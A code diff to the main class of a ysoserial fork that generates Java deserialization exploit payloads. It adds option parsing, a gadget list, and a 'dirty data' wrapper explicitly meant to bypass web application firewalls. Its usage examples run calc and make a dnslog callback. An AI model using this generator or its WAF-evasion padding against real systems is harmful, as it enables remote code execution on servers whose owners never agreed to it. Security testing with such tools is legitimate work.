@@ -6,31 +6,63 @@ import java.util.*;
 import me.gv7.woodpecker.yso.payloads.ObjectPayload;
 import me.gv7.woodpecker.yso.payloads.annotation.Authors;
 import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
+import me.gv7.woodpecker.yso.payloads.util.DirtyDataWrapper;
+import org.apache.commons.cli.*;
 
 @SuppressWarnings("rawtypes")
 public class GeneratePayload {
+    public static CommandLine cmdLine;
 	private static final int INTERNAL_ERROR_CODE = 70;
 	private static final int USAGE_CODE = 64;
+	private static final String VERSION = "0.4.0";
 
 	public static void main(final String[] args) {
-		if (args.length != 2) {
-			printUsage();
-			System.exit(USAGE_CODE);
-		}
-		final String payloadType = args[0];
-		final String command = args[1];
+        Options options = new Options();
+        options.addOption("g", "gadget",true, "java deserialization gadget");
+        options.addOption("a", "args",true, "gadget parameters");
+        options.addOption("ddl", "dirt-data-length",true,"Add the length of dirty data, used to bypass WAF");
+        options.addOption("l", "list",false, "List all gadgets");
+
+        CommandLineParser parser = new DefaultParser();
+
+        try {
+            cmdLine = parser.parse(options, args);
+        }catch (Exception e){
+            System.out.println("[*] Parameter input error, please use -h for more information");
+            printUsage(options);
+        }
+
+        if(args.length == 0){
+            printUsage(options);
+            System.exit(USAGE_CODE);
+        }
+
+        if(cmdLine.hasOption("list")){
+            listAllGadgets();
+            return;
+        }
+
+		final String payloadType = cmdLine.getOptionValue("gadget");
+		final String command = cmdLine.getOptionValue("args");
 
 		final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
 		if (payloadClass == null) {
 			System.err.println("Invalid payload type '" + payloadType + "'");
-			printUsage();
+			listAllGadgets();
 			System.exit(USAGE_CODE);
 			return; // make null analysis happy
 		}
 
 		try {
-			final ObjectPayload payload = payloadClass.newInstance();
-			final Object object = payload.getObject(command);
+		    ObjectPayload payload = payloadClass.newInstance();
+			Object object = payload.getObject(command);
+
+			if(cmdLine.hasOption("dirt-data-length")){
+			    int dirtDataLength = Integer.valueOf(cmdLine.getOptionValue("dirt-data-length"));
+                DirtyDataWrapper dirtyDataWrapper = new DirtyDataWrapper(object,dirtDataLength);
+                object = dirtyDataWrapper.doWrap();
+			}
+
 			PrintStream out = System.out;
 			Serializer.serialize(object, out);
 			ObjectPayload.Utils.releasePayload(payload, object);
@@ -42,9 +74,20 @@ public class GeneratePayload {
 		System.exit(0);
 	}
 
-	private static void printUsage() {
-		System.err.println("Y SO SERIAL?");
-		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
+    public static void printUsage(Options options){
+        System.out.println(String.format("ysoserial-for-woodpecker v%s   \n",VERSION));
+
+        new HelpFormatter().printHelp("ysoserial-for-woodpecker-<version>.jar", options, true);
+        System.out.println("\n");
+        System.out.println("Example:");
+        System.out.println("1. DNSLOG\n java -jar ysoserial-for-woodpecker-<version>.jar -g URLDNS -a http://test.dnslog.com/");
+        System.out.println("2. CC10\n  java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsCollections10 -a raw_cmd:calc\n\n");
+        listAllGadgets();
+        System.exit(0);
+    }
+
+	private static void listAllGadgets() {
+
 		System.err.println("  Available payload types:");
 
 		final List<Class<? extends ObjectPayload>> payloadClasses =
